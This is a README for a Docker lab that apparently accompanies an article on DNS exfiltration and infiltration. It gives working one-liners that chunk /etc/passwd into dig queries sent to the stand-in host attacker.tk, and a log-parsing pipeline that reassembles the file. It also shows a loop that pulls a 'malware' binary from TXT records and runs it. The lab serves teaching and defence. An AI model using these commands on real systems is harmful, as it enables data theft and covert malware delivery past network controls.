# DNS infiltration and exfiltration demo
This repository contains codes and examples used for this [article](https://floatingpoint.sorint.it/blog/post/introduction-to-dns-exfiltration-and-infiltration).
## Screeshots
![screenshot](/assets/screenshot.jpg)
## Requirements
- docker
- docker-compose-plugin (or old the docker-compose)
## Usage
Create three containers and two networks:
```
$ docker compose up -d
```
Open three different terminals and connect to each container:
```
docker exec -ti acme-server sh
docker exec -ti acme-dns sh
docker exec -ti attacker-dns sh
```
or, if you have `tmux` installed, just run this script to get a layout similar to the screenshot above:
```
tmux-setup.sh
```
## Examples
## Internal queries
Use dig, or equivalent command, to query some internal records:
```
💉 app@server.acme.corp ~ $ dig +short www.acme.corp
172.21.0.151
💉 app@server.acme.corp ~ $ dig +short ap.acme.corp
172.21.0.152
💉 app@server.acme.corp ~ $ dig +short db.acme.corp
172.21.0.153
```
All the queries will be answered by the internal DNS:
```
🌍 root@dns.acme.corp ~ # tail -f /var/log/dnsmasq.log
Dec  6 07:56:22 dnsmasq[1]: query[A] db.acme.corp from 172.21.0.3
Dec  6 07:56:22 dnsmasq[1]: config db.acme.corp is 172.21.0.153
Dec  6 07:56:26 dnsmasq[1]: query[A] www.acme.corp from 172.21.0.3
Dec  6 07:56:26 dnsmasq[1]: config www.acme.corp is 172.21.0.151
Dec  6 07:56:32 dnsmasq[1]: query[A] ap.acme.corp from 172.21.0.3
Dec  6 07:56:32 dnsmasq[1]: config ap.acme.corp is 172.21.0.152
Dec  6 07:56:38 dnsmasq[1]: query[A] db.acme.corp from 172.21.0.3
Dec  6 07:56:38 dnsmasq[1]: config db.acme.corp is 172.21.0.153
```
## External queries
Now ask for some external domain:
```
💉 app@server.acme.corp ~ $ dig +short www.google.com
216.58.209.36
💉 app@server.acme.corp ~ $ dig +short www.owasp.org
104.22.26.77
172.67.10.39
104.22.27.77
```
The internal DNS not knowing the answers, will forward the query to an external DNS (in this case 8.8.8.8):
```
🌍 root@dns.acme.corp ~ # tail -f /var/log/dnsmasq.log
Dec  6 08:03:46 dnsmasq[1]: query[A] www.google.com from 172.21.0.3
Dec  6 08:03:46 dnsmasq[1]: forwarded www.google.com to 8.8.8.8
Dec  6 08:03:46 dnsmasq[1]: reply www.google.com is 216.58.209.36
Dec  6 08:04:04 dnsmasq[1]: query[A] www.owasp.org from 172.21.0.3
Dec  6 08:04:04 dnsmasq[1]: forwarded www.owasp.org to 8.8.8.8
Dec  6 08:04:04 dnsmasq[1]: reply www.owasp.org is 104.22.26.77
Dec  6 08:04:04 dnsmasq[1]: reply www.owasp.org is 172.67.10.39
Dec  6 08:04:04 dnsmasq[1]: reply www.owasp.org is 104.22.27.77
```
## String exfiltration query
Query of a domain controlled by the attacker:
```
💉 app@server.acme.corp ~ $ dig +short whateveryouwant.attacker.tk               │
172.21.1.155
```
The internal DNS will forward to query to an external DNS (simulation for root -> TLD > authoritative DNS of the fake domain):
```
🌍 root@dns.acme.corp ~ # tail -f /var/log/dnsmasq.log
Dec  6 08:07:06 dnsmasq[1]: query[A] whateveryouwant.attacker.tk from 172.21.0.3
Dec  6 08:07:06 dnsmasq[1]: forwarded whateveryouwant.attacker.tk to 172.21.1.3
Dec  6 08:07:06 dnsmasq[1]: reply whateveryouwant.attacker.tk is 172.21.1.155
```
Logs from attacker DNS:
```
💀 root@dns.attacker.tk ~ # tail -f /var/log/dnsmasq.log
Dec  6 08:07:06 dnsmasq[1]: query[A] whateveryouwant.attacker.tk from 172.21.1.2
Dec  6 08:07:06 dnsmasq[1]: config whateveryouwant.attacker.tk is 172.21.1.155
```
## File exfiltration queries
Send a file through DNS queries:
```
💉 app@server.acme.corp ~ $ sha256sum /etc/passwd
a9eee6a30d5ed5f3fa07407373427c7acd73502ee3393c916519d1ee45a91fb4  /etc/passwd
💉 app@server.acme.corp ~ $ gzip -c /etc/passwd | base64 -w0 | fold -w63 | awk 'BEGIN {n = 100} {print "dig +short c"n"."$1".attacker.tk"; n++}' | sh
```
Logs from internal DNS:
```
🌍 root@dns.acme.corp ~ # tail -f /var/log/dnsmasq.log
<...>
Dec  6 09:56:56 dnsmasq[1]: query[A] c108.D51PXMrl3MVoc38VTxCp8p908S5iu2nT4u/1759EC2X8rWyKUg5nU5/wl/yun+o.attacker.tk
Dec  6 09:56:56 dnsmasq[1]: forwarded c108.D51PXMrl3MVoc38VTxCp8p908S5iu2nT4u/1759EC2X8rWyKUg5nU5/wl/yun+o.attacker.tk to 172.21.1.3
Dec  6 09:56:56 dnsmasq[1]: reply c108.D51PXMrl3MVoc38VTxCp8p908S5iu2nT4u/1759EC2X8rWyKUg5nU5/wl/yun+o.attacker.tk is 172.21.1.155
<...>
```
Logs from attacker DNS:
```
💀 root@dns.attacker.tk ~ # tail -f /var/log/dnsmasq.log
Dec  6 09:56:56 dnsmasq[1]: query[A] c108.D51PXMrl3MVoc38VTxCp8p908S5iu2nT4u/1759EC2X8rWyKUg5nU5/wl/yun+o.attacker.tk from 172.21.1.2
Dec  6 09:56:56 dnsmasq[1]: config c108.D51PXMrl3MVoc38VTxCp8p908S5iu2nT4u/1759EC2X8rWyKUg5nU5/wl/yun+o.attacker.tk is 172.21.1.155
```
Reassemble the file from the query log file:
```
💀 root@dns.attacker.tk ~ # grep -E "query\[A\] c\d{3}\." /var/log/dnsmasq.log | awk '{print $6}' | sort -u | cut -d "." -f2 | base64 -d | gunzip -d > mynewfile
💀 root@dns.attacker.tk ~ # sha256sum mynewfile
a9eee6a30d5ed5f3fa07407373427c7acd73502ee3393c916519d1ee45a91fb4  mynewfile
```
## File infiltration queries
Create TXT records from your "malware" binary (records already present in /etc/dnsmasq.conf):
```
💀 root@dns.attacker.tk ~ # file malware
malware: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped
💀 root@dns.attacker.tk ~ # gzip -c malware | base64 -w0 | fold -w63 | awk 'BEGIN {n = 100} {print "txt-record=c"n".attacker.tk,"$1; n++}'
txt-record=c100.attacker.tk,H4sIAAAAAAAAA+ydC3Bc1XnH7+phL7a8EiA7wpj4mpFhZaGX8UN+yN6VZbgiplL
txt-record=c101.attacker.tk,xA7WWWQlpbSnoNdIKC9gYTdYmWtabqEkno2ZoR6UvhT7QTFoqOiFIlrGEh5A1DI
<...>
txt-record=c222.attacker.tk,VXX8v1aw6N88085ifwN99/jHXxI6xXP7Rv3zF1/l7gFS/+Ss8E6GYAAA==
```
Get the binary quering 222 TXT records (one for each chunk):
```
💉 app@server.acme.corp ~ $ for n in $(seq 100 222);do echo "dig txt +short c$n.attacker.tk" ;done | sh | tr -d '"' | base64 -d | gzip -d > malware
```
Logs from internal DNS:
```
🌍 root@dns.acme.corp ~ # tail -f /var/log/dnsmasq.log
<...>
Dec  6 08:29:50 dnsmasq[1]: query[TXT] c218.attacker.tk from 172.21.0.3
Dec  6 08:29:50 dnsmasq[1]: forwarded c218.attacker.tk to 172.21.1.3
Dec  6 08:29:50 dnsmasq[1]: reply c218.attacker.tk is teIYPZu/+nsTPEQSCIoWgXDAlmjzAaBSgc61mBQpGA4ARo
HA6F4wYYLIKbcB1Ct
<...>
```
Logs from attacker DNS:
```
💀 root@dns.attacker.tk ~ # tail -f /var/log/dnsmasq.log
<...>
Dec  6 08:29:50 dnsmasq[1]: query[TXT] c218.attacker.tk from 172.21.1.2
Dec  6 08:29:50 dnsmasq[1]: config c218.attacker.tk is <TXT>
<...>
```
Check the binary and run it:
```
💉 app@server.acme.corp ~ $ ls -l malware
-rw-r--r-- 1 app app 26344 Dec  6 08:29 malware
💉 app@server.acme.corp ~ $ file malware
malware: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped
💉 app@server.acme.corp ~ $ ./malware
```